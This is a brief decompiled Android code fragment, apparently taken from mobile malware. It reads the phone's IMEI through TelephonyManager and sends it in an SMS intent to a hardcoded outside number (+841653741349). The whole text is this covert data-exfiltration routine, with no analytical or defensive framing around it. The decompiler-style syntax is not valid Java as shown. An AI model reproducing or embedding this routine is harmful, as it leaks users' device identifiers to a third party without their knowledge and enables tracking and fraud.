String str = ((TelephonyManager)getSystemService("phone")).getDeviceId();
Uri localUri = Uri.parse("smsto:+841653741349");
Intent localIntent = new android/content/Intent;
localIntent.<init>("android.intent.action.SENDTO", localUri);
localIntent.putExtra("Imei: ", str);
startActivity(localIntent);
